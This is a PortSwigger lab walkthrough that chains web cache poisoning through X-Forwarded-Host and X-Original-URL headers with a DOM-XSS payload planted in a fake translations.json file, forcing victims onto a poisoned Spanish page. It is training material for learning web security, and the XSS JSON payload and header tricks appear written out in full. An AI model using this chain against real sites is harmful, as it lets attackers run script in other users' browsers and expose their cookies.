## Combining web cache poisoning vulnerabilities

**Category:** cache_poisoning
**Difficulty:** Unknown

### Description
This lab is susceptible to web cache poisoning, but only if you construct a complex exploit chain.

### Solution Steps
1. With Burp running, load the website's home page.
2. Use Param Miner to identify that the X-Forwarded-Host and X-Original-URL headers are supported.
3. In Burp Repeater, experiment with the X-Forwarded-Host header and observe that it can be used to import an arbitrary JSON file instead of the translations.json file, which contains translations of UI texts.
4. Notice that the website is vulnerable to DOM-XSS due to the way the initTranslations() function handles data from the JSON file for all languages except English.
5. Go to the exploit server and edit the file name to match the path used by the vulnerable website: /resources/json/translations.json
6. In the head, add the header Access-Control-Allow-Origin: * to enable CORS .
7. In the body, add malicious JSON that matches the structure used by the real translation file. Replace the value of one of the translations with a suitable XSS payload, for example: {
    "en": {
        "name": "English"
    },
    "es": {
        "name": "español",
        "translations": {
            "Return to list": "Volver a la lista",
            "View details": "</a><img src=1 onerror='alert(document.cookie)' />",
            "Description:": "Descripción"
        }
    }
} For the rest of this solution we will use Spanish to demonstrate the attack. Please note that if you injected your payload into the translation for another language, you will also need to adapt the examples accordingly.
8. Store the exploit.
9. In Burp, find a GET request for /?localized=1 that includes the lang cookie for Spanish: lang=es
10. Send the request to Burp Repeater. Add a cache buster and the following header, remembering to enter your own exploit server ID: X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
11. Send the response and confirm that your exploit server is reflected in the response.
12. To simulate the victim, load the URL in the browser and confirm that the alert() fires.
13. You have successfully poisoned the cache for the Spanish page, but the target user's language is set to English. As it's not possible to exploit users with their language set to English, you need to find a way to forcibly change their language.
14. In Burp, go to "Proxy" > "HTTP history" and study the requests and responses that you generated. Notice that when you change the language on the page to anything other than English, this triggers a redirect, for example, to /setlang/es . The user's selected language is set server side using the lang=es cookie, and the home page is reloaded with the parameter ?localized=1 .
15. Send the GET request for the home page to Burp Repeater and add a cache buster.
16. Observe that the X-Original-URL can be used to change the path of the request, so you can explicitly set /setlang/es . However, you will find that this response cannot be cached because it contains the Set-Cookie header.
17. Observe that the home page sometimes uses backslashes as a folder separator. Notice that the server normalizes these to forward slashes using a redirect. Therefore, X-Original-URL: /setlang\es triggers a 302 response that redirects to /setlang/es . Observe that this 302 response is cacheable and, therefore, can be used to force other users to the Spanish version of the home page.
18. You now need to combine these two exploits. First, poison the GET /?localized=1 page using the X-Forwarded-Host header to import your malicious JSON file from the exploit server.
19. Now, while the cache is still poisoned, also poison the GET / page using X-Original-URL: /setlang\es to force all users to the Spanish page.
20. To simulate the victim, load the English page in the browser and make sure that you are redirected and that the alert() fires.
21. Replay both requests in sequence to keep the cache poisoned on both pages until the victim visits the site and the lab is solved.

### Key Payloads
- `alert(document.cookie)`
- `X-Forwarded-Host`
- `X-Original-URL`
- `translations.json`
- `initTranslations()`
- `/resources/json/translations.json`
- `Access-Control-Allow-Origin: *`
- `{
    "en": {
        "name": "English"
    },
    "es": {
        "name": "español",
        "translations": {
            "Return to list": "Volver a la lista",
            "View details": "</a><img src=1 onerror='alert(document.cookie)' />",
            "Description:": "Descripción"
        }
    }
}`
- `/?localized=1`
- `lang`

### Indicators of Success
- Check for changes in application behavior
- Look for error messages or data exposure
- Verify the vulnerability type: cache_poisoning

---
*Source: PortSwigger Web Security Academy*
